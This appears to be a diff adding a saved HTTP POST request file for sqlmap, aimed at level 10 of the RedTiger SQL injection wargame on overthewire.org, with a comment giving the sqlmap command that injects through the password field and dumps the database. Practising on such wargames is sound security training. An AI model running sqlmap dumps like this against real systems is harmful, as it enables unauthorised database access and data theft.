@@ -1,0 +1,3 @@
+http://redtiger.labs.overthewire.org:80/level10.php (POST)  # .\sqlmap.py -r .\postReqs\redtigerlevel10 -p password --dump
+
+password=fsfsfsdfdsf@gaisdasd&level10login=Login
